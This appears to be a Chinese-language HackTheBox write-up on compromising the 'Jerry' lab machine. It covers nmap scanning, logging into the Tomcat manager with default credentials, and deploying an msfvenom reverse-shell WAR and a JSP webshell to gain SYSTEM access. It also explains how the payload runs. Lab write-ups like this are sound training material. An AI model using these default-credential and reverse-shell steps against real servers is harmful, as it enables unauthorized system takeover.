Jerry是一个简单的靶机，知识点涉及Tomcat弱口令、Tomcat后台部署war包上线等。感兴趣的同学可以在HackTheBox中进行学习。![截屏2021-10-15
上午2.07.23](https://image.3001.net/images/20221021/1666318176_6351ff6019951dfa2d1eb.png!small)
_通关思维导图_  
![Jerry](https://image.3001.net/images/20221021/1666318178_6351ff629b163f8d427fe.png!small)

## 0x01 侦查

### 端口探测

首先通过nmap对目标进行端口扫描

    
    
    nmap -p- -sV -sC -A -T4 10.10.10.95 -oA nmap_Jerry
    

![截屏2021-10-15
上午2.21.18](https://image.3001.net/images/20221021/1666318180_6351ff648496518d220ee.png!small)  
扫描结果显示目前目标只开放了8080端口

#### 8080端口

访问`http://10.10.10.95:8080`为 Apache Tomcat 默认界面  
![截屏2021-10-15
上午2.22.25](https://image.3001.net/images/20221021/1666318182_6351ff669371dfd8c25ff.png!small)

## 0x02 上线[system]

### Tomcat弱口令

访问 Tomcat 控制台默认登陆页面`http://10.10.10.95:8080/manager/html`  
![截屏2021-10-15
上午3.15.26](https://image.3001.net/images/20221021/1666318184_6351ff68670996654fcea.png!small)

提示需要输入账号密码，输入错误的账号信息后重定向到401界面  
![截屏2021-10-15
上午3.15.07](https://image.3001.net/images/20221021/1666318186_6351ff6a12f44a8cb809e.png!small)

使用默认账号密码为 tomcat/s3cret 登录成功  
![截屏2021-10-15
上午3.17.11](https://image.3001.net/images/20221021/1666318187_6351ff6bccf8a841eb2c6.png!small)

### 后台部署war包

> web应用系统资源（WAR）文件是单个文件容器，其中包含基于Java的web应用程序所需的所有潜在文件，它可以包含jar文件、jsp文件、Java
> Servlet、Java类、网页和CSS等。/WEV-INF存档内的目录是一个特殊的目录，其中有一个文件名web.xml，用于定义应用程序的结构

#### 反弹shell

在管理后台中找到 war 包部署选项  
![截屏2021-10-15
下午4.07.49](https://image.3001.net/images/20221021/1666318189_6351ff6d65d7130123780.png!small)

使用 msfvenom 生成用于反弹shell的 war 包

    
    
    msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.7 lport=5555 -f war > shell.war
    

![截屏2021-10-15
下午4.12.11](https://image.3001.net/images/20221021/1666318190_6351ff6e8f3d5a4cd5e9b.png!small)

使用 jar 命令可列出 war 包中的具体目录和文件

    
    
    jar -ft shell.war
    

![截屏2021-10-15
下午4.13.07](https://image.3001.net/images/20221021/1666318191_6351ff6fee1869119f919.png!small)

在管理界面部署恶意 war 包  
![截屏2021-10-15
下午4.15.39](https://image.3001.net/images/20221021/1666318193_6351ff716620dda7ca59c.png!small)

在本地开启nc监听

    
    
    nc -nvlp 5555
    

通过 curl 访问目标木马文件，成功拿到反弹shell且权限为系统权限

    
    
    curl http://10.10.10.95:8080/shell/besnsrqpgskud.jsp
    

![截屏2021-10-15
下午4.18.45](https://image.3001.net/images/20221021/1666318194_6351ff72e6abea28e7b32.png!small)

在管理员桌面上寻找flag

    
    
    dir C:\Users\Administrator\Desktop\flags
    type C:\Users\Administrator\Desktop\flags\2*
    

![截屏2021-10-15
下午4.21.51](https://image.3001.net/images/20221021/1666318196_6351ff746421d64c59933.png!small)  
成功获取两个flag  
![截屏2021-10-15
下午4.22.51](https://image.3001.net/images/20221021/1666318198_6351ff760653fe969abe3.png!small)

#### webshell

使用 webshell 方式进行部署同样非常流行

    
    
    cp /usr/share/webshells/jsp/cmdjsp.jsp .
    

使用 Kali 自带的木马并将其打包为 war 包

    
    
    jar -cvf cmdjsp.war cmdjsp.jsp
    

直接部署后访问`http://10.10.10.95:8080/jsp/shell.jsp`，同样能够获取系统权限  
![截屏2021-10-15
下午4.45.05](https://image.3001.net/images/20221021/1666318199_6351ff775607187cc2bda.png!small)

查看 war 包的十六进制编码发现 war 文件其实就是一个 zip 存档

    
    
    head -c 16 shell.war | xxd
    

甚至可以直接使用 unzip 进行解压

    
    
    unzip -l shell.war 
    

![截屏2021-10-15
下午4.52.40](https://image.3001.net/images/20221021/1666318200_6351ff7890afbad093199.png!small)

尝试对 msfvenom 生成的 jsp 文件进行分析  
![截屏2021-10-15
下午4.55.28](https://image.3001.net/images/20221021/1666318202_6351ff7a893e8da9884bc.png!small)

分析代码后发现它完成了如下几个步骤：

    
    
    1、使用随机名称创建本地临时目录中文件的路径
    2、如果操作系统为 windows 则将.exe附加到文件名的末尾
    3、获取16进制的字符长度
    4、创建一个字节数组为十六进制字符串长度的一半，因为 ascii hex 使用两个字符来表示一个字节
    5、循环便利十六进制字符串，将十六进制字符串转换成字节值并将他们存储到数组中
    6、使用之前生成的exe路径创建一个文件流对象并将字节数组写入其中
    7、检查操作系统是否为windows，会创建一个字符串数组，将唯一条目设置为exe的字符串路径，之后将其传递给exec()执行函数，如果不是windows，会使用 chmod +x 来添加执行权限后再运行
    

## 0x03 总结

Jerry 出自经典动画猫和老鼠，其主人公为名为 Tom 的猫和名为 Jerry 的老鼠，而故事的内容主要讲的就是这对老冤家。通过信息收集发现 8080
端口为 Tomcat 的默认界面，使用 Tomcat 控制台默认密码可成功登录控制台，上传包含木马的 war 包并完成部署，从而成功拿到系统权限。

整个靶机的思路非常简单，只是使用了弱口令 + war 包部署的方式拿到系统权限，但 Tomcat 的应用场景非常广泛，通常会配合 Nginx
反向代理进行部署，很多情况下我们无法访问到它的管理界面甚至直接返回403，这并不意味着 Tomcat
已经无法利用，也可以尝试目录穿越来完成访问，具体可移步至"Tomcat 与反向代理实战利用"这篇文章进行查看。

